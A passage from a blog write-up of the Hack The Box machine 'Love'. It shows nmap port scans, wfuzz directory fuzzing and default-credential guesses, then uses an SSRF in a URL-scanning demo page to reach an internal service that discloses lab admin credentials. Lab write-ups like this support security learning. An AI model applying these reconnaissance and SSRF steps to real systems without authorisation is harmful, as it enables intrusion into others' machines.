<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Love Write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://g2jz.github.io/posts/love/" /><meta property="og:url" content="https://g2jz.github.io/posts/love/" /><meta property="og:site_name" content="root@g2jz:~#" /><meta property="og:image" content="https://g2jz.github.io/cover.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-28T09:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://g2jz.github.io/cover.png" /><meta property="twitter:title" content="Love Write-up" /><meta name="twitter:site" content="@g2jzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-02T22:37:27+02:00","datePublished":"2022-09-28T09:00:00+02:00","description":"Enumeration","headline":"Love Write-up","image":{"width":700,"height":300,"url":"https://g2jz.github.io/cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://g2jz.github.io/posts/love/"},"url":"https://g2jz.github.io/posts/love/"}</script><title>Love Write-up | root@g2jz:~#</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="root@g2jz:~#"><meta name="application-name" content="root@g2jz:~#"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">root@g2jz:~#</a></div><div class="site-subtitle font-italic">g2jz's Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/g2jz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/gaizka-martin/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/g2jzz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmartinmendiola','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Love Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Love Write-up</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1664348400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 28, 2022 </em> </span> <span> Updated <em class="" data-ts="1664743047" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 2, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 300'%3E%3C/svg%3E" data-src="/assets/img/posts/love/cover.png" class="preview-img bg" alt="Preview Image" width="700" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/g2jzz">Gaizka Martín Mendiola</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3114 words"> <em>17 min</em> read</span></div></div></div><div class="post-content"><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved <a href="https://github.com/nmap/nmap">nmap</a>. The scan that we will be using scans all the port range, displays only the open ports and uses the TCP Syn Port Scan method. Additionally, DNS resolution and host discovery are disabled to speed up the scan. All evidence is stored in the <code class="language-plaintext highlighter-rouge">allPorts</code> file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allPorts 10.10.10.239
</pre></table></code></div></div><div file="enum/allPorts" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/allPorts"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Mon Jul 26 23:54:07 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.239
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.239 ()	Status: Up
Host: 10.10.10.239 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp//unknown///, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
# Nmap done at Mon Jul 26 23:54:23 2021 -- 1 IP address (1 host up) scanned in 16.19 seconds
</pre></table></code></div></div><p>Once we have the open ports, we will perform a more exhaustive exam. This scan will let us know what services and versions of them are running on the ports that we have just discovered are open. To do that, we will use the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 <span class="nt">-oN</span> targeted 10.10.10.239
</pre></table></code></div></div><div file="enum/targeted" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/targeted"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Mon Jul 26 23:55:04 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.045s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   FourOhFourRequest, Kerberos: 
|_    Host '10.10.14.248' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-07-26T22:32:35+00:00; +34m34s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=7/26%Time=60FF2F47%P=x86_64-pc-linux-gnu%r(Ke
SF:rberos,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.248'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhF
SF:ourRequest,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.248'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m34s, deviation: 3h30m01s, median: 34m33s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-26T15:32:20-07:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-26T22:32:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 26 23:58:02 2021 -- 1 IP address (1 host up) scanned in 177.83 seconds
</pre></table></code></div></div><p>We can see that the number of ports that are open is huge. We will explore them in order so we don’t get lost.</p><h3 id="web-server"><span class="mr-2">Web Server</span><a href="#web-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we will start enumerating the web server that is running on port 80. We open the browser and type in our target machine’s IP address. We will see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Login Page</em></p><p>We are in front of a login page. If we look at the URL, we can see that the login page is in the <code class="language-plaintext highlighter-rouge">index.php</code> file. This indicates that the web page is built in <code class="language-plaintext highlighter-rouge">PHP</code>, so we will keep this in mind.</p><p>After trying some default credentials (<code class="language-plaintext highlighter-rouge">admin:admin</code>, <code class="language-plaintext highlighter-rouge">user:password</code>, <code class="language-plaintext highlighter-rouge">administrator:password</code>) we can not authenticate against the server, so we will continue exploring.</p><p>To explorer further, we will fuzz the web server in order to find hidden directories. We will use <a href="https://github.com/xmendez/wfuzz">wfuzz</a> and the <code class="language-plaintext highlighter-rouge">Dirbuster's</code> <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code> wordlist:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-f</span> fuzzRoot,raw <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/FUZZ
</pre></table></code></div></div><div file="enum/fuzzRoot" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/fuzzRoot"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>Target: http://10.10.10.239/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    125 L	     324 W	   4388 Ch	  "# directory-list-2.3-medium.txt"
00006:  C=200    125 L	     324 W	   4388 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00009:  C=200    125 L	     324 W	   4388 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00013:  C=200    125 L	     324 W	   4388 Ch	  "#"
00007:  C=200    125 L	     324 W	   4388 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00004:  C=200    125 L	     324 W	   4388 Ch	  "#"
00002:  C=200    125 L	     324 W	   4388 Ch	  "#"
00003:  C=200    125 L	     324 W	   4388 Ch	  "# Copyright 2007 James Fisher"
00005:  C=200    125 L	     324 W	   4388 Ch	  "# This work is licensed under the Creative Commons"
00012:  C=200    125 L	     324 W	   4388 Ch	  "# on at least 2 different hosts"
00010:  C=200    125 L	     324 W	   4388 Ch	  "#"
00011:  C=200    125 L	     324 W	   4388 Ch	  "# Priority ordered case sensitive list, where entries were found"
00016:  C=301      9 L	      30 W	    338 Ch	  "images"
00014:  C=200    125 L	     324 W	   4388 Ch	  "http://10.10.10.239/"
00008:  C=200    125 L	     324 W	   4388 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00203:  C=301      9 L	      30 W	    338 Ch	  "Images"
00259:  C=301      9 L	      30 W	    337 Ch	  "admin"
00519:  C=301      9 L	      30 W	    339 Ch	  "plugins"
00638:  C=301      9 L	      30 W	    340 Ch	  "includes"
00902:  C=503     11 L	      44 W	    402 Ch	  "examples"

Total time: 0
Processed Requests: 1139
Filtered Requests: 1119
Requests/sec.: 0
</pre></table></code></div></div><p>We can see that some interesting directories are found: <code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">images</code> and <code class="language-plaintext highlighter-rouge">plugins</code>. We will have this in mind and we will continue fuzzing the <code class="language-plaintext highlighter-rouge">admin</code> directory, as it seems the most intriguing one. We will this time fuzz for files with <code class="language-plaintext highlighter-rouge">PHP</code> extension inside of the <code class="language-plaintext highlighter-rouge">admin</code> folder:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-f</span> fuzzAdminPHP,raw <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/admin/FUZZ.php
</pre></table></code></div></div><div file="enum/fuzzAdminPHP" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/fuzzAdminPHP"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>Target: http://10.10.10.239/admin/FUZZ.php
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    169 L	     450 W	   6198 Ch	  "# directory-list-2.3-medium.txt"
00005:  C=200    169 L	     450 W	   6198 Ch	  "# This work is licensed under the Creative Commons"
00009:  C=200    169 L	     450 W	   6198 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00004:  C=200    169 L	     450 W	   6198 Ch	  "#"
00007:  C=200    169 L	     450 W	   6198 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00006:  C=200    169 L	     450 W	   6198 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00002:  C=200    169 L	     450 W	   6198 Ch	  "#"
00003:  C=200    169 L	     450 W	   6198 Ch	  "# Copyright 2007 James Fisher"
00008:  C=200    169 L	     450 W	   6198 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00010:  C=200    169 L	     450 W	   6198 Ch	  "#"
00011:  C=200    169 L	     450 W	   6198 Ch	  "# Priority ordered case sensitive list, where entries were found"
00015:  C=200    169 L	     450 W	   6198 Ch	  "index"
00013:  C=200    169 L	     450 W	   6198 Ch	  "#"
00012:  C=200    169 L	     450 W	   6198 Ch	  "# on at least 2 different hosts"
00038:  C=302    412 L	    1114 W	  16257 Ch	  "home"
00053:  C=302      0 L	       0 W	      0 Ch	  "login"
00142:  C=302      4 L	      47 W	    397 Ch	  "print"
00286:  C=302    412 L	    1114 W	  16257 Ch	  "Home"
00659:  C=200    169 L	     450 W	   6198 Ch	  "Index"
00825:  C=302      0 L	       0 W	      0 Ch	  "Login"
01225:  C=302      0 L	       0 W	      0 Ch	  "logout"
05085:  C=200    169 L	     450 W	   6198 Ch	  "INDEX"
05192:  C=302    490 L	    1277 W	  19800 Ch	  "positions"
05955:  C=302      4 L	      47 W	    397 Ch	  "Print"

Total time: 0
Processed Requests: 6975
Filtered Requests: 6951
Requests/sec.: 0
</pre></table></code></div></div><p>We can see a bunch of files. If we look at the status codes of the found pages, we can see that all of them have <code class="language-plaintext highlighter-rouge">302</code> status code, except the <code class="language-plaintext highlighter-rouge">index.php</code>, which has a <code class="language-plaintext highlighter-rouge">200</code> status code. If we try to navigate to any of the files with <code class="language-plaintext highlighter-rouge">302</code> status code, we will notice that we are being redirected to the <code class="language-plaintext highlighter-rouge">index.php</code> page.</p><h3 id="intended-path-web-server-on-port-443-and-ssrf-server-side-request-forgery"><span class="mr-2">Intended path: Web server on port 443 and SSRF (Server-Side Request Forgery)</span><a href="#intended-path-web-server-on-port-443-and-ssrf-server-side-request-forgery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Remembering the enumeration phase of the target machine, we know that there is another web server running on port 443. The downside of this server is that we can’t access it:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum9.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Web Server in Port 443</em></p><p>If we examine the website further, we can see the following in the certificate that is being used:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum10.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>HTTPS Certificate</em></p><p>We can see that a domain is being leaked in the <code class="language-plaintext highlighter-rouge">SSL</code> certificate. This domain is <code class="language-plaintext highlighter-rouge">staging.love.htb</code> and we will add it to our <code class="language-plaintext filepath highlighter-rouge">/etc/hosts</code> file, as we guess the target machine could be using some sort of <code class="language-plaintext highlighter-rouge">Virtual Hosting</code> (host multiple domain names on a single machine). If we access this resource in our browser, we will see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum6.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>staging.love.htb</em></p><p>If we go to the <code class="language-plaintext highlighter-rouge">demo</code> tab:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum7.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Demo tab</em></p><p>We can see that this service asks for a <code class="language-plaintext highlighter-rouge">URL</code>, that later is analyzed to find <code class="language-plaintext highlighter-rouge">Malware</code> in it.</p><p>We are in front of a service that is asking us for a <code class="language-plaintext highlighter-rouge">URL</code>. We will try to point this <code class="language-plaintext highlighter-rouge">URL</code> to the internal resources of the machine, hoping we can find useful information. To do this, we will point it to the <code class="language-plaintext highlighter-rouge">127.0.0.1</code> IP address, which corresponds to <code class="language-plaintext highlighter-rouge">localhost</code> or, in other words, to the machine that is running the web server. If we achieve listing internal resources from the target machine, we will be facing an <code class="language-plaintext highlighter-rouge">SSRF (Server-Side Request Forgery)</code> vulnerability.</p><p>If we remember the enumeration phase, we had another web server running on port 5000. This web server, like the one on port 443, is unreachable. We will try to access it from the <code class="language-plaintext highlighter-rouge">staging.love.htb</code> <code class="language-plaintext highlighter-rouge">demo</code> tab:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum8.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>SSRF</em></p><p>We can see that the following credentials for the <code class="language-plaintext highlighter-rouge">admin</code> user are being displayed:</p><div file="credentials/webCreds" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/webCreds"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>admin:@LoveIsInTheAir!!!!
